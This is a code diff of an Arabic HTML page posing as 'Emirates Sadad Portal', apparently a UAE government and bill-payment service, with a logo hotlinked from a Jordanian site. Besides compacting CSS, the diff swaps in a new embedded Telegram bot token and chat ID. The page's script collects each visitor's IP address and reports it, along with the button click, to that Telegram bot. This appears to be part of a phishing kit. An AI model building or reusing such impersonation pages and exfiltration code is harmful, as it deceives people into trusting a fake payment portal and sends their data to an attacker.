@@ -17,11 +17,7 @@
             --success-color: #2ecc71;
         }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
 
         body {
             font-family: 'Tajawal', sans-serif;
@@ -46,16 +42,8 @@
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
         }
 
-        .header img {
-            height: 80px;
-            margin-bottom: 10px;
-        }
-
-        .header h1 {
-            color: var(--primary-color);
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
+        .header img { height: 80px; margin-bottom: 10px; }
+        .header h1 { color: var(--primary-color); font-size: 24px; margin-bottom: 10px; }
 
         .form-container {
             background-color: white;
@@ -73,19 +61,8 @@
             margin-bottom: 20px;
         }
 
-        .description {
-            margin-bottom: 30px;
-            line-height: 1.8;
-        }
-
-        .description h2 {
-            margin-bottom: 15px;
-            color: var(--text-color);
-        }
-
-        .description p {
-            margin-bottom: 10px;
-        }
+        .description { margin-bottom: 30px; line-height: 1.8; }
+        .description h2 { margin-bottom: 15px; color: var(--text-color); }
 
         .btn {
             display: inline-block;
@@ -99,21 +76,15 @@
             font-weight: 500;
             font-family: 'Tajawal', sans-serif;
             transition: background-color 0.3s;
-        }
-
-        .btn:hover {
-            background-color: #006600;
-        }
-
-        .btn-block {
-            display: block;
             width: 100%;
         }
+
+        .btn:hover { background-color: #006600; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div id="page1" class="page active">
+        <div id="page1">
             <div class="header">
                 <img src="https://petra.gov.jo/upload/1542630954928.jpg" alt="شعار سداد الإمارات">
                 <h1>بوابة سداد الإمارات</h1>
@@ -126,32 +97,26 @@
                 <div class="description">
                     <h2>عن سداد الإمارات</h2>
                     <p>سداد الإمارات هي منصة دفع إلكتروني آمنة وسهلة الاستخدام تتيح للمواطنين والمقيمين في دولة الإمارات العربية المتحدة دفع فواتيرهم ورسومهم الحكومية والخاصة بكل يسر وأمان.</p>
-                    <p>تتميز المنصة بتكاملها مع جميع البنوك المحلية وتوفرها على أعلى معايير الأمان والخصوصية لضمان سلامة معاملاتك المالية.</p>
-                    <p>يمكنك استخدام سداد الإمارات لدفع فواتير الكهرباء والماء والهاتف والإنترنت والعديد من الخدمات الأخرى.</p>
                 </div>
                 
-                <button id="startService" class="btn btn-block">بدء الخدمة</button>
+                <button id="startService" class="btn">بدء الخدمة</button>
             </div>
         </div>
     </div>
 
     <script>
-        const telegramBotToken = '8591237339:AAHOMH_hwr6ts_zlKb3ClGXb7RBpZ8ii5j0';
-        const telegramChatId = '1848565778';
+        const telegramBotToken = '8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw';
+        const telegramChatId = '8362204213';
         let userIP = '';
 
-        // الحصول على IP المستخدم
         async function getUserIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 userIP = data.ip;
-            } catch (error) {
-                userIP = 'غير معروف';
-            }
+            } catch (error) { userIP = 'غير معروف'; }
         }
 
-        // إرسال رسالة للتلغرام
         async function sendToTelegram(message) {
             try {
                 const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
@@ -169,15 +134,11 @@
                     localStorage.setItem('telegramMessageId', data.result.message_id);
                     localStorage.setItem('telegramMessageContent', message);
                 }
-            } catch (error) {
-                console.error('خطأ في إرسال الرسالة:', error);
-            }
+            } catch (error) { console.error('Error:', error); }
         }
 
-        // تهيئة الصفحة
         document.addEventListener('DOMContentLoaded', function() {
             getUserIP();
-
             document.getElementById('startService').addEventListener('click', async function() {
                 const message = `🟢 <b>زيارة جديدة - بوابة سداد الإمارات</b>\n\n🌐 عنوان IP: ${userIP}\n📅 التاريخ: ${new Date().toLocaleString('ar-AE')}\n\n✅ تم الضغط على "بدء الخدمة"`;
                 await sendToTelegram(message);
